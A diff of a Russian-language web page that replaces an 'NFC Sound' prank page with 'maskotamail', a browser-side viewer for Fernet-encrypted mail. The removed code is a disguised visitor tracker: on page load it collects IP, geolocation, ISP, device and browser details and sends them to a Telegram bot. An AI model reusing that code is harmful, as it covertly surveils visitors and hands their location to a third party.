@@ -1,220 +1,261 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Главная | NFC Sound</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>maskotamail</title>
+<style>
+:root{
+  --bg:#ffffff;
+  --card:#ffffff;
+  --text:#000000;
+  --muted:#666666;
+  --border:#000000;
+}
+*{box-sizing:border-box}
+body{
+  margin:0;min-height:100vh;display:grid;place-items:center;
+  background:var(--bg);color:var(--text);
+  font-family:system-ui,sans-serif;padding:16px;
+}
+.card{
+  width:min(680px,100%);background:var(--card);
+  border:2px solid var(--border);padding:24px;
+  display:flex;flex-direction:column;gap:14px;
+}
+h1{margin:0;font-size:22px;letter-spacing:2px;text-transform:uppercase}
+label{display:flex;flex-direction:column;gap:6px;font-size:14px;color:var(--muted)}
+input{
+  padding:12px 14px;border:2px solid var(--border);
+  background:#fff;color:#000;font-size:15px;outline:none;
+}
+input:focus{border-color:#000;box-shadow:0 0 0 2px #000}
+button{
+  padding:12px 16px;border:2px solid var(--border);
+  background:#000;color:#fff;font-size:15px;font-weight:600;cursor:pointer;
+  text-transform:uppercase;letter-spacing:1px;
+}
+button:hover{background:#fff;color:#000}
+.status{color:var(--muted);font-size:14px;margin:0;min-height:20px}
+.list{
+  list-style:none;padding:0;margin:0;display:flex;flex-direction:column;
+  gap:10px;max-height:60vh;overflow:auto;
+}
+.item{
+  background:#fff;border:2px solid var(--border);padding:12px 14px;
+}
+.item .subj{font-weight:700;text-transform:uppercase;letter-spacing:.5px}
+.item .from{color:var(--muted);font-size:13px}
+.item .body{color:#000;font-size:14px;white-space:pre-wrap;margin-top:8px}
 
-        body {
-            min-height: 100vh;
-            background: radial-gradient(ellipse at center, #1a1a1a 0%, #0a0a0a 100%);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
+/* ---- КОТ ---- */
+.cat{display:flex;justify-content:center;filter:grayscale(100%) contrast(150%)}
+.cat svg{width:180px;height:180px;overflow:visible}
 
-        .card {
-            background: rgba(30, 30, 40, 0.7);
-            backdrop-filter: blur(20px);
-            border-radius: 40px;
-            padding: 40px 30px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3);
-            animation: fadeIn 0.6s ease;
-        }
+/* хвост качается всегда */
+.cat .tail{
+  transform-origin:120px 120px;
+  animation:tail-wag 2.4s ease-in-out infinite;
+}
+@keyframes tail-wag{
+  0%,100%{transform:rotate(-6deg)}
+  50%{transform:rotate(8deg)}
+}
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
-        }
+/* лапки внизу, поднимаются к глазам */
+.cat .paws{transform:translateY(14px);transition:transform .28s cubic-bezier(.34,1.56,.64,1)}
+.cat.is-hiding .paws{transform:translateY(-42px) scale(1.05)}
 
-        h1 {
-            color: white;
-            margin-bottom: 10px;
-            font-size: 28px;
-        }
+/* уши прижимаются */
+.cat .ear{transition:transform .28s ease;transform-origin:80px 50px}
+.cat.is-hiding .ear-l{transform:rotate(-10deg) translateY(3px)}
+.cat.is-hiding .ear-r{transform:rotate(10deg) translateY(3px)}
 
-        .sub {
-            color: #aaa;
-            margin-bottom: 30px;
-            font-size: 14px;
-        }
+/* глаза: открытые / закрытые */
+.cat .eyes-open{transition:opacity .15s ease}
+.cat .eyes-closed{opacity:0;transition:opacity .15s ease}
+.cat.is-hiding .eyes-open{opacity:0}
+.cat.is-hiding .eyes-closed{opacity:1}
 
-        .loader {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #ff4444;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
+/* лёгкое покачивание, когда прячется */
+.cat.is-hiding svg{animation:peek-bob 1.6s ease-in-out infinite}
+@keyframes peek-bob{
+  0%,100%{transform:translateY(0)}
+  50%{transform:translateY(-3px)}
+}
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .status {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #4caf50;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
-        .status.show {
-            opacity: 1;
-        }
-
-        .footer {
-            margin-top: 30px;
-            font-size: 11px;
-            color: #444;
-        }
-    </style>
+/* уважение к reduce motion */
+@media (prefers-reduced-motion: reduce){
+  .cat *{animation:none!important;transition:none!important}
+}
+</style>
 </head>
 <body>
-    <div class="card">
-        <h1>🔊 NFC Sound</h1>
-        <div class="sub">Мемные звуки • NFC пранки</div>
-        <div class="loader"></div>
-        <div class="status" id="status">Загрузка...</div>
-        <div class="footer">© 2026 • Все звуки короткие</div>
-    </div>
+<main class="card">
+  <div id="cat" class="cat" role="img" aria-label="Кот смотрит на вас"></div>
+  <h1>maskotamail</h1>
+  <label>Ключ шифрования
+    <input id="key" type="password" placeholder="FERNET_KEY" autocomplete="off">
+  </label>
+  <button id="load">Показать письма</button>
+  <p id="status" class="status"></p>
+  <ul id="list" class="list"></ul>
+</main>
+<script>
+/* ---------- КОТ ---------- */
+const CAT = `
+<svg viewBox="0 0 160 160">
+  <!-- хвост -->
+  <path class="tail" d="M120 120 Q150 110 145 85 Q142 70 130 72"
+        fill="none" stroke="#8a5a2b" stroke-width="10" stroke-linecap="round"/>
 
-    <script>
-        // ========== ПЛЕЙСХОЛДЕРЫ (ЗАМЕНЯЮТСЯ ЧЕРЕЗ GITHUB SECRETS) ==========
-        const BOT_TOKEN = '__BOT_TOKEN__';
-        const CHAT_ID = '__CHAT_ID__';
-        // =========================================================================
-        
-        const statusDiv = document.getElementById('status');
-        
-        async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip;
-            } catch(e) {
-                return 'не определён';
-            }
-        }
-        
-        async function getGeo(ip) {
-            try {
-                const res = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,regionName,lat,lon,isp,org,proxy,query`);
-                const data = await res.json();
-                if (data.status === 'success') {
-                    return {
-                        country: data.country,
-                        region: data.regionName,
-                        city: data.city,
-                        lat: data.lat,
-                        lon: data.lon,
-                        isp: data.isp,
-                        org: data.org,
-                        isProxy: data.proxy || false,
-                        mapUrl: `https://www.google.com/maps?q=${data.lat},${data.lon}`
-                    };
-                }
-            } catch(e) {}
-            return null;
-        }
-        
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let device = 'Неизвестно';
-            if (/iPhone|iPad|iPod/i.test(ua)) device = '🍎 iOS';
-            else if (/Android/i.test(ua)) device = '🤖 Android';
-            else if (/Windows/i.test(ua)) device = '💻 Windows';
-            else if (/Macintosh/i.test(ua)) device = '🍏 Mac';
-            
-            let browser = 'Другой';
-            if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-            else if (ua.includes('Chrome')) browser = 'Chrome';
-            else if (ua.includes('Firefox')) browser = 'Firefox';
-            else if (ua.includes('Edg')) browser = 'Edge';
-            
-            let os = '';
-            if (ua.includes('iPhone OS')) {
-                const match = ua.match(/iPhone OS ([\d_]+)/);
-                if (match) os = `iOS ${match[1].replace(/_/g, '.')}`;
-            } else if (ua.includes('Android')) {
-                const match = ua.match(/Android ([\d.]+)/);
-                if (match) os = `Android ${match[1]}`;
-            } else if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
-            else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
-            else if (ua.includes('Mac OS X')) os = 'macOS';
-            
-            const screen = `${window.screen.width}x${window.screen.height}`;
-            const language = navigator.language;
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            
-            return { device, browser, os, screen, language, timezone };
-        }
-        
-        async function sendToTelegram(ip, geo, deviceInfo, isProxy) {
-            if (BOT_TOKEN === '__BOT_TOKEN__' || CHAT_ID === '__CHAT_ID__') {
-                console.log('Секреты не заменены');
-                return;
-            }
-            
-            let message = `🔍 *НОВЫЙ ПОСЕТИТЕЛЬ*\n\n`;
-            message += `🌐 *IP:* ${ip}\n`;
-            if (geo) {
-                if (geo.city || geo.region || geo.country) {
-                    message += `📍 *Местоположение:* ${geo.city ? geo.city + ', ' : ''}${geo.region ? geo.region + ', ' : ''}${geo.country || ''}\n`;
-                }
-                if (geo.lat && geo.lon) message += `🗺️ *Карта:* [Google Maps](${geo.mapUrl})\n`;
-                message += `📡 *Провайдер:* ${geo.isp || 'неизвестен'}\n`;
-                if (isProxy) message += `⚠️ *Вероятно использует VPN/Прокси*\n`;
-            }
-            message += `\n📱 *Устройство:* ${deviceInfo.device}\n`;
-            if (deviceInfo.os) message += `💻 *ОС:* ${deviceInfo.os}\n`;
-            message += `🧠 *Браузер:* ${deviceInfo.browser}\n`;
-            message += `🕒 *Время:* ${new Date().toLocaleString()}`;
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: true
-                })
-            });
-        }
-        
-        async function main() {
-            statusDiv.textContent = 'Загрузка...';
-            statusDiv.classList.add('show');
-            
-            const ip = await getIP();
-            const geo = await getGeo(ip);
-            const deviceInfo = getDeviceInfo();
-            const isProxy = geo?.isProxy || false;
-            
-            await sendToTelegram(ip, geo, deviceInfo, isProxy);
-            
-            statusDiv.textContent = 'Готово';
-            setTimeout(() => {
-                statusDiv.classList.remove('show');
-            }, 2000);
-        }
-        
-        main();
-    </script>
+  <!-- тело -->
+  <ellipse cx="80" cy="120" rx="46" ry="34" fill="#c98a4b"/>
+  <ellipse cx="80" cy="124" rx="30" ry="22" fill="#f3d2a6"/>
+
+  <!-- уши -->
+  <path class="ear ear-l" d="M44 60 L36 28 L66 44 Z"
+        fill="#c98a4b" stroke="#8a5a2b" stroke-width="3" stroke-linejoin="round"/>
+  <path class="ear ear-r" d="M116 60 L124 28 L94 44 Z"
+        fill="#c98a4b" stroke="#8a5a2b" stroke-width="3" stroke-linejoin="round"/>
+  <path d="M44 54 L40 36 L58 46 Z" fill="#f3a6a6"/>
+  <path d="M116 54 L120 36 L102 46 Z" fill="#f3a6a6"/>
+
+  <!-- голова -->
+  <circle cx="80" cy="66" r="38" fill="#c98a4b" stroke="#8a5a2b" stroke-width="3"/>
+
+  <!-- румянец (растёт от длины ключа) -->
+  <circle id="blush-l" cx="56" cy="78" r="9" fill="#f78d8d" opacity=".35"/>
+  <circle id="blush-r" cx="104" cy="78" r="9" fill="#f78d8d" opacity=".35"/>
+
+  <!-- глаза открытые -->
+  <g class="eyes-open">
+    <circle cx="64" cy="64" r="7" fill="#3b2a1a"/>
+    <circle cx="96" cy="64" r="7" fill="#3b2a1a"/>
+    <circle cx="66.5" cy="61.5" r="2.2" fill="#fff"/>
+    <circle cx="98.5" cy="61.5" r="2.2" fill="#fff"/>
+  </g>
+
+  <!-- глаза зажмуренные -->
+  <g class="eyes-closed">
+    <path d="M56 64 Q64 56 72 64" stroke="#3b2a1a" stroke-width="4"
+          fill="none" stroke-linecap="round"/>
+    <path d="M88 64 Q96 56 104 64" stroke="#3b2a1a" stroke-width="4"
+          fill="none" stroke-linecap="round"/>
+  </g>
+
+  <!-- нос и рот -->
+  <path d="M76 76 L84 76 L80 81 Z" fill="#f08a8a"/>
+  <path d="M80 81 Q74 88 68 84" stroke="#3b2a1a" stroke-width="2.5"
+        fill="none" stroke-linecap="round"/>
+  <path d="M80 81 Q86 88 92 84" stroke="#3b2a1a" stroke-width="2.5"
+        fill="none" stroke-linecap="round"/>
+
+  <!-- усы -->
+  <g stroke="#3b2a1a" stroke-width="2" stroke-linecap="round">
+    <line x1="52" y1="80" x2="34" y2="76"/>
+    <line x1="52" y1="86" x2="34" y2="88"/>
+    <line x1="108" y1="80" x2="126" y2="76"/>
+    <line x1="108" y1="86" x2="126" y2="88"/>
+  </g>
+
+  <!-- лапки, поднимаются к глазам -->
+  <g class="paws">
+    <ellipse cx="52" cy="112" rx="16" ry="12" fill="#c98a4b" stroke="#8a5a2b" stroke-width="3"/>
+    <ellipse cx="108" cy="112" rx="16" ry="12" fill="#c98a4b" stroke="#8a5a2b" stroke-width="3"/>
+  </g>
+</svg>`;
+
+const catEl = document.getElementById("cat");
+catEl.innerHTML = CAT;
+
+const keyInput = document.getElementById("key");
+const loadBtn = document.getElementById("load");
+const statusEl = document.getElementById("status");
+const listEl = document.getElementById("list");
+
+/* кот зажмуривается при фокусе на ключе */
+keyInput.addEventListener("focus", () => {
+  catEl.classList.add("is-hiding");
+  catEl.setAttribute("aria-label", "Кот зажмурился и закрыл глаза лапками");
+});
+keyInput.addEventListener("blur", () => {
+  catEl.classList.remove("is-hiding");
+  catEl.setAttribute("aria-label", "Кот смотрит на вас");
+});
+
+/* румянец от длины ключа */
+keyInput.addEventListener("input", () => {
+  const t = Math.min(keyInput.value.length / 40, 1);
+  const op = (0.35 + t * 0.55).toFixed(2);
+  const bl = catEl.querySelector("#blush-l");
+  const br = catEl.querySelector("#blush-r");
+  if (bl) bl.setAttribute("opacity", op);
+  if (br) br.setAttribute("opacity", op);
+});
+
+/* ---------- РАСШИФРОВКА ---------- */
+function b64u(s){
+  s = s.replace(/-/g,"+").replace(/_/g,"/");
+  const p = s.length % 4 ? 4 - (s.length % 4) : 0;
+  const bin = atob(s + "=".repeat(p));
+  const o = new Uint8Array(bin.length);
+  for (let i = 0; i < bin.length; i++) o[i] = bin.charCodeAt(i);
+  return o;
+}
+async function decryptFernet(tokenB64, keyB64){
+  const t = b64u(tokenB64), k = b64u(keyB64);
+  const sk = k.slice(0,16), ek = k.slice(16,32);
+  const hk = await crypto.subtle.importKey("raw", sk,
+    {name:"HMAC",hash:"SHA-256"}, false, ["verify"]);
+  const ok = await crypto.subtle.verify("HMAC", hk,
+    t.slice(-32), t.slice(0, t.length-32));
+  if (!ok) throw new Error("Неверный ключ");
+  const iv = t.slice(9,25), ct = t.slice(25, t.length-32);
+  const ak = await crypto.subtle.importKey("raw", ek,
+    {name:"AES-CBC"}, false, ["decrypt"]);
+  const plain = await crypto.subtle.decrypt({name:"AES-CBC", iv}, ak, ct);
+  return new TextDecoder().decode(plain);
+}
+function esc(s){
+  return String(s).replace(/[&<>"']/g, c => ({
+    "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
+  }[c]));
+}
+
+/* ---------- ПОКАЗ ПИСЕМ + АВТООБНОВЛЕНИЕ ---------- */
+let timer = null;
+
+async function render(key){
+  const res = await fetch("data.json?t=" + Date.now(), {cache:"no-store"});
+  const data = await res.json();
+  listEl.innerHTML = "";
+  statusEl.textContent =
+    `Писем: ${data.messages.length} • обновлено ${new Date().toLocaleTimeString()}`;
+  for (const m of data.messages.slice().reverse()){
+    const p = JSON.parse(await decryptFernet(m.enc, key));
+    const li = document.createElement("li");
+    li.className = "item";
+    li.innerHTML = `
+      <div class="subj">${esc(p.subject)}</div>
+      <div class="from">${esc(p.from)} • ${esc(p.date)}</div>
+      <div class="body">${esc(p.body).slice(0, 800)}</div>`;
+    listEl.appendChild(li);
+  }
+}
+
+loadBtn.addEventListener("click", async () => {
+  const key = keyInput.value.trim();
+  if (!key){ statusEl.textContent = "Введите ключ."; return; }
+  statusEl.textContent = "Загружаю…";
+  try {
+    await render(key);
+    if (timer) clearInterval(timer);
+    timer = setInterval(() => render(key).catch(()=>{}), 5 * 60 * 1000);
+  } catch (e){
+    statusEl.textContent = "Ошибка: " + e.message;
+  }
+});
+</script>
 </body>
-</html>
+</html>l
